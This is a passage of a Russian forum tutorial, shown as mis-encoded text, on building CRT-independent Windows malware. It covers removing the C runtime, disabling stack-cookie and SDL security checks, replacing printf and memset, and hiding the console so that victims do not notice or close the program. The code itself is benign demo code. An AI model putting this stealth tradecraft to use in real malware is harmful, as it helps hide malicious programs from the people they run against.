–ü–µ—Ä–≤–∞—è –æ—à–∏–±–∫–∞ &quot;LNK2001 - unresolved external symbol mainCRTStartup&quot; —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ —Ç–æ, —á—Ç–æ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä –Ω–µ —Å–º–æ–≥ –Ω–∞–π—Ç–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–∏–º–≤–æ–ª–∞ &quot;mainCRTStartup&quot;. –≠—Ç–æ –æ–∂–∏–¥–∞–µ–º–æ, —Ç–∞–∫ –∫–∞–∫ &quot;mainCRTStartup&quot; —è–≤–ª—è–µ—Ç—Å—è —Ç–æ—á–∫–æ–π –≤—Ö–æ–¥–∞ –¥–ª—è –ø—Ä–æ–≥—Ä–∞–º–º—ã, —Å–≤—è–∑–∞–Ω–Ω–æ–π —Å –±–∏–±–ª–∏–æ—Ç–µ–∫–æ–π CRT, —á—Ç–æ –Ω–µ –∏–º–µ–µ—Ç –º–µ—Å—Ç–∞ –≤ –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ. –ß—Ç–æ–±—ã —Ä–µ—à–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É, —Å–ª–µ–¥—É–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –Ω–æ–≤—ã–π —Å–∏–º–≤–æ–ª —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788578603.png"
		data-src="https://osint42.org/attachments/1746788578603-png.289/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788578603-png.289/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788578603.png"
			title="1746788578603.png"
			width="1150" height="649" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788583699.png"
		data-src="https://osint42.org/attachments/1746788583699-png.290/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788583699-png.290/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788583699.png"
			title="1746788583699.png"
			width="1140" height="635" loading="lazy" />
	</div><br />
<br />
–°–∏–º–≤–æ–ª &quot;main&quot; –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π —Ñ—É–Ω–∫—Ü–∏—é main –≤ –∏—Å—Ö–æ–¥–Ω–æ–º –∫–æ–¥–µ. –î–ª—è –≤—ã–±–æ—Ä–∞ –¥—Ä—É–≥–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –≤ –∫–∞—á–µ—Å—Ç–≤–µ —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞ –ø—Ä–æ—Å—Ç–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —Å–∏–º–≤–æ–ª —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞ –Ω–∞ –∏–º—è —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏. –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –∫–æ–º–ø–∏–ª—è—Ü–∏—è –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –º–µ–Ω—å—à–µ–º—É –∫–æ–ª–∏—á–µ—Å—Ç–≤—É –æ—à–∏–±–æ–∫, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788590169.png"
		data-src="https://osint42.org/attachments/1746788590169-png.291/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788590169-png.291/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788590169.png"
			title="1746788590169.png"
			width="919" height="141" loading="lazy" />
	</div><br />
<br />
<b>–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</b><br />
<br />
–°–ª–µ–¥—É—é—â–∞—è –æ—à–∏–±–∫–∞, &quot;LNK2001 - unresolved external symbol __security_check_cookie&quot;, –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä –Ω–µ –Ω–∞—à–µ–ª —Å–∏–º–≤–æ–ª &quot;__security_check_cookie&quot;. –≠—Ç–æ—Ç —Å–∏–º–≤–æ–ª –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–µ–∫–æ–≤–æ–π –∫—É–∫–∏, –∫–æ—Ç–æ—Ä–∞—è —è–≤–ª—è–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–µ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞—é—â–µ–π –ø–µ—Ä–µ–ø–æ–ª–Ω–µ–Ω–∏–µ –±—É—Ñ–µ—Ä–∞ —Å—Ç–µ–∫–∞. –ß—Ç–æ–±—ã —Ä–µ—à–∏—Ç—å —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É, —É—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –æ–ø—Ü–∏—é Security Check –Ω–∞ &quot;Disable Security Check (/Gs-)&quot;, –∫–∞–∫ –ø–æ–∫–∞–∑–∞–Ω–æ –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788597534.png"
		data-src="https://osint42.org/attachments/1746788597534-png.292/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788597534-png.292/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788597534.png"
			title="1746788597534.png"
			width="1180" height="644" loading="lazy" />
	</div><br />
<br />
<b>–û—Ç–∫–ª—é—á–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–æ–∫ SDL</b><br />
<br />
–ü–æ—Å–ª–µ –æ—Ç–∫–ª—é—á–µ–Ω–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –æ—à–∏–±–∫–∞ –∏—Å—á–µ–∑–∞–µ—Ç, –Ω–æ –ø–æ—è–≤–ª—è–µ—Ç—Å—è –Ω–æ–≤–æ–µ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788603502.png"
		data-src="https://osint42.org/attachments/1746788603502-png.293/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788603502-png.293/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788603502.png"
			title="1746788603502.png"
			width="1019" height="157" loading="lazy" />
	</div><br />
<br />
–ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ &quot;D9025 - overriding &#039;/sdl&#039; with &#039;/GS-&#039;&quot; –º–æ–∂–Ω–æ —Ä–µ—à–∏—Ç—å, –æ—Ç–∫–ª—é—á–∏–≤ –ø—Ä–æ–≤–µ—Ä–∫–∏ Security Development Lifecycle (SDL).<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788616525.png"
		data-src="https://osint42.org/attachments/1746788616525-png.294/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788616525-png.294/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788616525.png"
			title="1746788616525.png"
			width="1166" height="616" loading="lazy" />
	</div><br />
<br />
–û—Å—Ç–∞—é—Ç—Å—è –¥–≤–µ –Ω–µ—Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–µ –æ—à–∏–±–∫–∏ —Å–∏–º–≤–æ–ª–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ —Ä–µ—à–∞—é—Ç—Å—è –≤ —Ä–∞–∑–¥–µ–ª–µ –ó–∞–º–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–π –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT –Ω–∏–∂–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788625598.png"
		data-src="https://osint42.org/attachments/1746788625598-png.295/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788625598-png.295/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788625598.png"
			title="1746788625598.png"
			width="1054" height="155" loading="lazy" />
	</div><br />
<br />
<b>–ó–∞–º–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–π –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT</b><br />
<br />
–ò–∑-–∑–∞ —É–¥–∞–ª–µ–Ω–∏—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT –æ—Å—Ç–∞–ª–∏—Å—å –¥–≤–µ –Ω–µ—Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã–µ –æ—à–∏–±–∫–∏ –∏–∑-–∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ printf –¥–ª—è –≤—ã–≤–æ–¥–∞ –Ω–∞ –∫–æ–Ω—Å–æ–ª—å, —Ö–æ—Ç—è –±–∏–±–ª–∏–æ—Ç–µ–∫–∞ CRT –±—ã–ª–∞ —É–¥–∞–ª–µ–Ω–∞ –∏–∑ –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
–ü—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –Ω–∞–ø–∏—Å–∞—Ç—å —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–µ –≤–µ—Ä—Å–∏–∏ —Ñ—É–Ω–∫—Ü–∏–π, —Ç–∞–∫–∏–µ –∫–∞–∫ printf, strlen, strcat, memcpy. –î–ª—è —ç—Ç–æ–π —Ü–µ–ª–∏ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, –Ω–∞–ø—Ä–∏–º–µ—Ä, <a href="https://github.com/vxunderground/VX-API" target="_blank" class="link link--external" rel="noopener">VX-API</a>. –ù–∞–ø—Ä–∏–º–µ—Ä, <a href="https://github.com/vxunderground/VX-API/blob/main/VX-API/StringCompare.cpp" target="_blank" class="link link--external" rel="noopener">StringCompare.cpp</a> –∑–∞–º–µ–Ω—è–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é strcmp –¥–ª—è —Å—Ä–∞–≤–Ω–µ–Ω–∏—è —Å—Ç—Ä–æ–∫.<br />
<br />
<b>–ó–∞–º–µ–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏ Printf</b><br />
<br />
–î–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã, –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–π –≤ —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ, —Ñ—É–Ω–∫—Ü–∏—è printf –∑–∞–º–µ–Ω—è–µ—Ç—Å—è —Å–ª–µ–¥—É—é—â–µ–π –º–∞–∫—Ä–æ–∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }</code></pre>
	</div>
</div><br />
–ú–∞–∫—Ä–æ–∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è PRINTA –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–≤–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–∞:<br />
<ul>
<li data-xf-list-type="ul">STR - –°—Ç—Ä–æ–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞, –∫–æ—Ç–æ—Ä–∞—è –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç, –∫–∞–∫ –≤—ã–≤–æ–¥–∏—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç.</li>
<li data-xf-list-type="ul"><b>VA_ARGS</b> –∏–ª–∏ ... - –ê—Ä–≥—É–º–µ–Ω—Ç—ã, –∫–æ—Ç–æ—Ä—ã–µ –Ω—É–∂–Ω–æ –≤—ã–≤–µ—Å—Ç–∏. –ú–∞–∫—Ä–æ–∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è PRINTA –≤—ã–¥–µ–ª—è–µ—Ç –∫—É—á–µ–≤–æ–π –±—É—Ñ–µ—Ä —Ä–∞–∑–º–µ—Ä–æ–º 1024 –±–∞–π—Ç–∞, –∑–∞—Ç–µ–º –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é wsprintfA –¥–ª—è –∑–∞–ø–∏—Å–∏ –æ—Ç—Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∏–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ (<b>VA_ARGS</b>) –≤ –±—É—Ñ–µ—Ä —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Å—Ç—Ä–æ–∫–∏ —Ñ–æ—Ä–º–∞—Ç–∞ (STR). –ó–∞—Ç–µ–º –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è WriteConsoleA WinAPI –¥–ª—è –∑–∞–ø–∏—Å–∏ –ø–æ–ª—É—á–µ–Ω–Ω–æ–π —Å—Ç—Ä–æ–∫–∏ –Ω–∞ –∫–æ–Ω—Å–æ–ª—å, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ —Ñ—É–Ω–∫—Ü–∏—é GetStdHandle WinAPI.</li>
</ul>–ó–∞–º–µ–Ω–∞ printf –Ω–∞ PRINTA –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ —Ç–æ–º—É, —á—Ç–æ –ø—Ä–æ–≥—Ä–∞–º–º–∞ Hello World —Å—Ç–∞–Ω–æ–≤–∏—Ç—Å—è –Ω–µ–∑–∞–≤–∏—Å–∏–º–æ–π –æ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT. –≠—Ç–æ—Ç –∫–æ–¥ —É—Å—Ç—Ä–∞–Ω—è–µ—Ç –æ—Å—Ç–∞–≤—à–∏–µ—Å—è –æ—à–∏–±–∫–∏ –∏ —Ç–µ–ø–µ—Ä—å –º–æ–∂–µ—Ç —É—Å–ø–µ—à–Ω–æ –∫–æ–º–ø–∏–ª–∏—Ä–æ–≤–∞—Ç—å—Å—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }
 
int main() {
    PRINTA(&quot;Hello World ! \n&quot;);
    return 0;
}</code></pre>
	</div>
</div><br />
<b>–°–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û, –Ω–µ–∑–∞–≤–∏—Å–∏–º–æ–≥–æ –æ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ CRT</b><br />
<br />
–ü—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä–æ–µ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –±–∏–±–ª–∏–æ—Ç–µ–∫—É CRT, —Å–ª–µ–¥—É–µ—Ç —É—á–µ—Å—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ –º–æ–º–µ–Ω—Ç–æ–≤.<br />
<br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏—Ö —Ñ—É–Ω–∫—Ü–∏–π</b><br />
<br />
–ù–µ–∫–æ—Ç–æ—Ä—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –∏ –º–∞–∫—Ä–æ—Å—ã –≤ Visual Studio –∏—Å–ø–æ–ª—å–∑—É—é—Ç —Ñ—É–Ω–∫—Ü–∏–∏ CRT –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Å–≤–æ–∏—Ö –∑–∞–¥–∞—á. –ù–∞–ø—Ä–∏–º–µ—Ä, –º–∞–∫—Ä–æ—Å ZeroMemory –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é CRT memset –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –Ω—É–ª—è–º–∏. –≠—Ç–æ —Ç—Ä–µ–±—É–µ—Ç –æ—Ç —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞ –ø–æ–∏—Å–∫–∞ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã —ç—Ç–æ–º—É –º–∞–∫—Ä–æ—Å—É, —Ç–∞–∫ –∫–∞–∫ –µ–≥–æ –Ω–µ–ª—å–∑—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å. –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ñ—É–Ω–∫—Ü–∏—è –∏–∑ <a href="https://github.com/vxunderground/VX-API/blob/main/VX-API/CopyMemoryEx.cpp" target="_blank" class="link link--external" rel="noopener">CopyMemoryEx.cpp</a> –≤ –∫–∞—á–µ—Å—Ç–≤–µ –∑–∞–º–µ–Ω—ã.<br />
<br />
–î—Ä—É–≥–∏–º —Ä–µ—à–µ–Ω–∏–µ–º –º–æ–∂–µ—Ç –±—ã—Ç—å —Ä—É—á–Ω–æ–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏—Ö –≤–µ—Ä—Å–∏–π —Ñ—É–Ω–∫—Ü–∏–π, –æ—Å–Ω–æ–≤–∞–Ω–Ω—ã—Ö –Ω–∞ CRT, —Ç–∞–∫–∏—Ö –∫–∞–∫ memset. –≠—Ç–æ –∑–∞—Å—Ç–∞–≤–ª—è–µ—Ç –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å —ç—Ç—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫—É—é —Ñ—É–Ω–∫—Ü–∏—é –≤–º–µ—Å—Ç–æ —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –≤–µ—Ä—Å–∏–∏ CRT. –ü–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ –º–∞–∫—Ä–æ—Å—ã, —Ç–∞–∫–∏–µ –∫–∞–∫ ZeroMemory, —Ç–∞–∫–∂–µ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç—É –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫—É—é —Ñ—É–Ω–∫—Ü–∏—é.<br />
<br />
–î–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ —ç—Ç–æ–≥–æ –º–æ–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫—É—é –≤–µ—Ä—Å–∏—é —Ñ—É–Ω–∫—Ü–∏–∏ memset –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä—É —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º, –∏—Å–ø–æ–ª—å–∑—É—è –∫–ª—é—á–µ–≤–æ–µ —Å–ª–æ–≤–æ intrinsic.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;

// –ö–ª—é—á–µ–≤–æ–µ —Å–ª–æ–≤–æ `extern` –∑–∞–¥–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é `memset` –∫–∞–∫ –≤–Ω–µ—à–Ω—é—é —Ñ—É–Ω–∫—Ü–∏—é.
extern void* __cdecl memset(void*, int, size_t);

// –ú–∞–∫—Ä–æ—Å—ã #pragma intrinsic(memset) –∏ #pragma function(memset) - —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞, —Å–ø–µ—Ü–∏—Ñ–∏—á–Ω—ã–µ –¥–ª—è Microsoft.
// –û–Ω–∏ –∑–∞—Å—Ç–∞–≤–ª—è—é—Ç –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å –∫–æ–¥ –¥–ª—è —Ñ—É–Ω–∫—Ü–∏–∏ memset —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –≤—Å—Ç—Ä–æ–µ–Ω–Ω–æ–π –∏–Ω—Ç—Ä–∏–≥–∏—Ä—É—é—â–µ–π —Ñ—É–Ω–∫—Ü–∏–∏.
#pragma intrinsic(memset)
#pragma function(memset)

void* __cdecl memset(void* Destination, int Value, size_t Size) {
    // –ª–æ–≥–∏–∫–∞, –∞–Ω–∞–ª–æ–≥–∏—á–Ω–∞—è memset
    unsigned char* p = (unsigned char*)Destination;
    while (Size &gt; 0) {
        *p = (unsigned char)Value;
        p++;
        Size--;
    }
    return Destination;
}

int main() {
    PVOID pBuff = HeapAlloc(GetProcessHeap(), 0, 0x100);
    if (pBuff == NULL)
        return -1;

    // —ç—Ç–æ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –Ω–∞—à—É –≤–µ—Ä—Å–∏—é &#039;memset&#039; –≤–º–µ—Å—Ç–æ –≤–µ—Ä—Å–∏–∏ CRT Library
    ZeroMemory(pBuff, 0x100);

    HeapFree(GetProcessHeap(), 0, pBuff);

    return 0;
}</code></pre>
	</div>
</div><br />
<b>–°–∫—Ä—ã—Ç–∏–µ –æ–∫–Ω–∞ –∫–æ–Ω—Å–æ–ª–∏</b><br />
<br />
–í—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ –Ω–µ –¥–æ–ª–∂–Ω–æ —Å–æ–∑–¥–∞–≤–∞—Ç—å –æ–∫–Ω–æ –∫–æ–Ω—Å–æ–ª–∏ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏, —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ –≤—ã–∑—ã–≤–∞–µ—Ç –ø–æ–¥–æ–∑—Ä–µ–Ω–∏–µ –∏ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º—É, –∑–∞–∫—Ä—ã–≤ –æ–∫–Ω–æ. –î–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è —ç—Ç–æ–≥–æ –º–æ–∂–Ω–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é ShowWindow(NULL, SW_HIDE) –≤ –Ω–∞—á–∞–ª–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Ç–æ—á–∫–∏ –≤—Ö–æ–¥–∞, —Ö–æ—Ç—è —ç—Ç–æ —Ç—Ä–µ–±—É–µ—Ç –≤—Ä–µ–º–µ–Ω–∏ (–≤ –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥–∞—Ö) –∏ –º–æ–∂–µ—Ç –≤—ã–∑–≤–∞—Ç—å –∑–∞–º–µ—Ç–Ω–æ–µ –º–µ—Ä—Ü–∞–Ω–∏–µ.<br />
<br />
–õ—É—á—à–∏–º —Ä–µ—à–µ–Ω–∏–µ–º —è–≤–ª—è–µ—Ç—Å—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ø—Ä–æ–≥—Ä–∞–º–º—ã –¥–ª—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –∫–∞–∫ GUI-–ø—Ä–æ–≥—Ä–∞–º–º—ã, —É—Å—Ç–∞–Ω–æ–≤–∏–≤ –æ–ø—Ü–∏—é SubSystem Visual Studio –≤ &quot;Windows (/SUBSYSTEM:WINDOWS)&quot;.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788649003.png"
		data-src="https://osint42.org/attachments/1746788649003-png.296/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788649003-png.296/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788649003.png"
			title="1746788649003.png"
			width="1211" height="684" loading="lazy" />
	</div><br />
<br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è</b><br />
<br />
–ü–æ—Å–ª–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤—Å–µ—Ö –æ–ø–∏—Å–∞–Ω–Ω—ã—Ö –≤ —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ—à–∞–≥–æ–≤, –ø–æ–ª—É—á–∞—é—Ç—Å—è —Å–ª–µ–¥—É—é—â–∏–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã.<br />
<br />
–í–æ-–ø–µ—Ä–≤—ã—Ö, —Ä–∞–∑–º–µ—Ä –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ —É–º–µ–Ω—å—à–∞–µ—Ç—Å—è —Å 112,5 –∫–∏–ª–æ–±–∞–π—Ç –¥–æ –ø—Ä–∏–º–µ—Ä–Ω–æ 3 –∫–∏–ª–æ–±–∞–π—Ç.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788656147.png"
		data-src="https://osint42.org/attachments/1746788656147-png.297/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
